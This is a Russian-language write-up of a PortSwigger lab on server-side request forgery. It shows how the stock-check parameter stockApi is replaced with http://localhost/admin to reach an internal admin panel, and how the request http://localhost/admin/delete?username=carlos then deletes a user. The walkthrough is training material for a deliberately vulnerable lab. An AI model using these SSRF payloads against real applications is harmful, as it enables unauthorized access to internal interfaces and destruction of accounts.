---
title: "Basic SSRF against the local server"
date: 2025-07-22
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/ssrf-apprentice/ssrf/lab-basic-ssrf-against-localhost"
classes: wide
---

Эта лаба содержит уязвимость **SSRF** (Server-side request forgery).

Нужно получить доступ к интерфейсу админа `http://localhost/admin` и удалить пользователя `carlos`.

```
https://0a0400cb04d88ca581104ddf00b90037.web-security-academy.net/
```

## Solution

Следуя из задачи, нам нужно найти место на сайте, где используется обращение по `HTTP` на сервер.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Basic_SSRF_against_the_local_server/1.png){: height="200" .align-center}

При нажатии на кнопку `Check stock` отправляется `HTTP`-запрос на внешний ресурс, и результат подставляется на место вызова.

```http
POST /product/stock HTTP/2

Host: 0a0400cb04d88ca581104ddf00b90037.web-security-academy.net
Cookie: session=EqA7ic9vbBVvFyCUEHLcOxMY8ACPeOyI
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0400cb04d88ca581104ddf00b90037.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a0400cb04d88ca581104ddf00b90037.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D3
```

Заменим `stockApi` на `http://localhost/admin`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Basic_SSRF_against_the_local_server/2.png){: height="200" .align-center}

Мы получили страницу админ панели. Теперь нам нужно узнать, с помощью какого запроса происходит удаление пользователя.

```html
</header>
<section>
	<h1>Users</h1>
	<div>
		<span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
	</div>
    <div>
        <span>carlos - </span>
		<a href="/admin/delete?username=carlos">Delete</a>
	</div>
</section>
```

Из кода страницы понятно, что для удаления пользователя `carlos` нам нужно отправить следующий `HTTP`-запрос: `http://localhost/admin/delete?username=carlos`. Отправим запрос и проверим результат.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Basic_SSRF_against_the_local_server/3.png){: height="200" .align-center}